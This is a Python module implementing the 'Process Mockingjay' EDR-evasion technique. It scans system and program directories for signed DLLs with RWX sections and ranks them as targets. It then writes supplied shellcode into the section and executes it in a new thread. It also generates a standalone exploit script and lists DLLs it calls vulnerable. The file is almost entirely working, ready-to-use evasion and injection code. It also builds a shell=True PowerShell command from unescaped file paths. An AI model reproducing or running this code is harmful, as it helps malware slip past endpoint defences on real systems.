"""
Process Mockingjay Implementation

Advanced EDR evasion technique that abuses misconfigured RWX sections in
legitimate, signed DLLs to execute malicious code without triggering EDR alerts.

Discovered in 2023-2024, this technique represents a significant evolution
in memory-based evasion.

Reference: "The Modern Hacker's Playbook" - Part 2.2
"""

import os
import sys
import logging
import ctypes
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from pathlib import Path

try:
    import pefile
    PEFILE_AVAILABLE = True
except ImportError:
    PEFILE_AVAILABLE = False


@dataclass
class MockingjayTarget:
    """Target DLL for Process Mockingjay"""
    dll_path: str
    dll_name: str
    rwx_section_name: str
    rwx_offset: int
    rwx_size: int
    is_signed: bool
    suitability_score: float = 0.0


class ProcessMockingjayEngine:
    """
    Process Mockingjay exploitation engine.

    This technique works by:
    1. Finding legitimate, signed DLLs with RWX memory sections
    2. Loading the DLL into the process
    3. Writing shellcode to the RWX section
    4. Executing the shellcode

    Why it evades EDR:
    - No suspicious API calls (CreateRemoteThread, VirtualAllocEx, etc.)
    - Writes to legitimate, trusted module memory
    - Memory is already RWX - no VirtualProtect needed
    - From EDR's perspective, behavior appears benign

    Example:
        >>> engine = ProcessMockingjayEngine()
        >>> targets = engine.find_targets()
        >>> best_target = engine.rank_targets(targets)[0]
        >>> success = engine.exploit(best_target, shellcode)
    """

    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.targets: List[MockingjayTarget] = []

        if sys.platform != "win32":
            self.logger.error("Process Mockingjay is Windows-only")

        if not PEFILE_AVAILABLE:
            self.logger.error("pefile required. Install: pip install pefile")

    def find_targets(self, search_paths: Optional[List[str]] = None,
                    signed_only: bool = True) -> List[MockingjayTarget]:
        """
        Find potential Mockingjay targets (DLLs with RWX sections).

        Args:
            search_paths: Directories to search (default: Windows system dirs)
            signed_only: Only include signed DLLs

        Returns:
            List of potential targets
        """
        if sys.platform != "win32":
            return []

        if not PEFILE_AVAILABLE:
            return []

        if not search_paths:
            search_paths = [
                os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32'),
                os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'SysWOW64'),
                os.environ.get('ProgramFiles', 'C:\\Program Files'),
                os.environ.get('ProgramFiles(x86)', 'C:\\Program Files (x86)'),
            ]

        targets = []

        self.logger.info("Scanning for Mockingjay targets...")

        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue

            for root, dirs, files in os.walk(search_path):
                for file in files:
                    if not file.lower().endswith('.dll'):
                        continue

                    dll_path = os.path.join(root, file)

                    # Analyze DLL
                    target = self._analyze_dll(dll_path, signed_only)
                    if target:
                        targets.append(target)
                        self.logger.info(f"Found target: {file} ({target.rwx_section_name})")

        self.targets = targets
        self.logger.info(f"Found {len(targets)} Mockingjay targets")
        return targets

    def _analyze_dll(self, dll_path: str, signed_only: bool) -> Optional[MockingjayTarget]:
        """Analyze a DLL for RWX sections"""
        try:
            pe = pefile.PE(dll_path, fast_load=True)

            # Check signature if required
            if signed_only and not self._is_signed(dll_path):
                return None

            is_signed = self._is_signed(dll_path)

            # Check each section
            for section in pe.sections:
                if self._is_rwx_section(section):
                    target = MockingjayTarget(
                        dll_path=dll_path,
                        dll_name=os.path.basename(dll_path),
                        rwx_section_name=section.Name.decode('utf-8').rstrip('\x00'),
                        rwx_offset=section.VirtualAddress,
                        rwx_size=section.Misc_VirtualSize,
                        is_signed=is_signed
                    )

                    # Calculate suitability score
                    target.suitability_score = self._calculate_suitability(target)

                    return target

        except Exception as e:
            # Skip problematic DLLs
            pass

        return None

    def _is_rwx_section(self, section) -> bool:
        """Check if section has RWX permissions"""
        characteristics = section.Characteristics

        is_readable = characteristics & 0x40000000  # IMAGE_SCN_MEM_READ
        is_writable = characteristics & 0x80000000  # IMAGE_SCN_MEM_WRITE
        is_executable = characteristics & 0x20000000  # IMAGE_SCN_MEM_EXECUTE

        return is_readable and is_writable and is_executable

    def _is_signed(self, file_path: str) -> bool:
        """Check if file is digitally signed"""
        try:
            import subprocess
            cmd = f'powershell -Command "(Get-AuthenticodeSignature \'{file_path}\').Status -eq \'Valid\'"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            return "True" in result.stdout
        except:
            return False

    def _calculate_suitability(self, target: MockingjayTarget) -> float:
        """
        Calculate suitability score for a target.

        Higher score = better target for evasion.

        Factors:
        - Signed DLLs are better
        - Larger RWX sections are better
        - System DLLs are better (more trusted)
        """
        score = 0.0

        # Signed = +50 points
        if target.is_signed:
            score += 50

        # System directory = +30 points
        if 'system32' in target.dll_path.lower() or 'syswow64' in target.dll_path.lower():
            score += 30

        # Large section = +20 points
        if target.rwx_size > 0x10000:  # > 64KB
            score += 20

        # Microsoft-signed = +40 points (detect by path)
        if 'windows' in target.dll_path.lower():
            score += 40

        return score

    def rank_targets(self, targets: Optional[List[MockingjayTarget]] = None) -> List[MockingjayTarget]:
        """
        Rank targets by suitability score.

        Args:
            targets: Targets to rank (default: self.targets)

        Returns:
            Sorted list (best first)
        """
        if targets is None:
            targets = self.targets

        return sorted(targets, key=lambda t: t.suitability_score, reverse=True)

    def exploit(self, target: MockingjayTarget, shellcode: bytes) -> bool:
        """
        Exploit a Mockingjay target with shellcode.

        Args:
            target: Target DLL
            shellcode: Shellcode to execute

        Returns:
            True if successful
        """
        if sys.platform != "win32":
            return False

        try:
            kernel32 = ctypes.windll.kernel32

            # Step 1: Load the target DLL
            self.logger.info(f"Loading {target.dll_name}...")
            dll_handle = kernel32.LoadLibraryW(target.dll_path)

            if not dll_handle:
                self.logger.error("Failed to load DLL")
                return False

            # Step 2: Calculate shellcode address
            shellcode_addr = dll_handle + target.rwx_offset

            self.logger.info(f"RWX section at: 0x{shellcode_addr:x}")

            # Check size
            if len(shellcode) > target.rwx_size:
                self.logger.error(f"Shellcode too large ({len(shellcode)} > {target.rwx_size})")
                return False

            # Step 3: Write shellcode to RWX section
            # This is the key: NO VirtualProtect needed!
            written = ctypes.c_size_t(0)
            current_process = kernel32.GetCurrentProcess()

            self.logger.info("Writing shellcode to RWX section...")
            success = kernel32.WriteProcessMemory(
                current_process,
                ctypes.c_void_p(shellcode_addr),
                shellcode,
                len(shellcode),
                ctypes.byref(written)
            )

            if not success or written.value != len(shellcode):
                self.logger.error("Failed to write shellcode")
                return False

            self.logger.info(f"Wrote {written.value} bytes")

            # Step 4: Execute shellcode
            # Create thread at shellcode location
            thread_id = ctypes.c_ulong(0)

            self.logger.info("Executing shellcode...")
            thread_handle = kernel32.CreateThread(
                None,                           # Security attributes
                0,                              # Stack size
                ctypes.c_void_p(shellcode_addr),  # Start address
                None,                           # Parameter
                0,                              # Creation flags
                ctypes.byref(thread_id)         # Thread ID
            )

            if not thread_handle:
                self.logger.error("Failed to create thread")
                return False

            self.logger.info(f"Shellcode executing in thread {thread_id.value}")
            self.logger.info("Process Mockingjay: SUCCESS")

            # Wait for thread (optional)
            # kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)

            return True

        except Exception as e:
            self.logger.error(f"Exploit failed: {e}")
            return False

    def generate_exploit_script(self, target: MockingjayTarget) -> str:
        """
        Generate a standalone exploit script for a target.

        Args:
            target: Target to generate script for

        Returns:
            Python script as string
        """
        script = f"""#!/usr/bin/env python3
\"\"\"
Process Mockingjay Exploit
Target: {target.dll_name}
Section: {target.rwx_section_name}
Generated by REVENG
\"\"\"

import ctypes

def exploit():
    # Your shellcode here
    shellcode = b"\\x90" * 100  # NOP sled example

    kernel32 = ctypes.windll.kernel32

    # Load target DLL
    dll_handle = kernel32.LoadLibraryW(r"{target.dll_path}")
    if not dll_handle:
        print("[!] Failed to load DLL")
        return False

    # Calculate shellcode address
    shellcode_addr = dll_handle + {hex(target.rwx_offset)}
    print(f"[*] RWX section at: {{hex(shellcode_addr)}}")

    # Write shellcode
    written = ctypes.c_size_t(0)
    current_process = kernel32.GetCurrentProcess()

    success = kernel32.WriteProcessMemory(
        current_process,
        ctypes.c_void_p(shellcode_addr),
        shellcode,
        len(shellcode),
        ctypes.byref(written)
    )

    if not success:
        print("[!] Failed to write shellcode")
        return False

    print(f"[+] Wrote {{written.value}} bytes")

    # Execute
    thread_id = ctypes.c_ulong(0)
    thread_handle = kernel32.CreateThread(
        None,
        0,
        ctypes.c_void_p(shellcode_addr),
        None,
        0,
        ctypes.byref(thread_id)
    )

    if not thread_handle:
        print("[!] Failed to create thread")
        return False

    print(f"[+] Shellcode executing in thread {{thread_id.value}}")
    return True

if __name__ == "__main__":
    print("[*] Process Mockingjay Exploit")
    print(f"[*] Target: {target.dll_name}")
    print(f"[*] Section: {target.rwx_section_name} ({{hex(target.rwx_size)}} bytes)")
    print(f"[*] Signed: {target.is_signed}")
    print()

    if exploit():
        print("[+] Exploit successful!")
    else:
        print("[-] Exploit failed")
"""

        return script


# Known vulnerable DLLs (for reference)
KNOWN_VULNERABLE_DLLS = {
    "msys-2.0.dll": {
        "description": "MSYS2 runtime (Visual Studio component)",
        "section": ".text",
        "notes": "Commonly found in Visual Studio installations"
    },
    "cygwin1.dll": {
        "description": "Cygwin POSIX emulation layer",
        "section": ".text",
        "notes": "Found in Cygwin installations"
    },
    "Qt5Core.dll": {
        "description": "Qt framework core library",
        "section": ".text",
        "notes": "Found in Qt-based applications"
    },
}
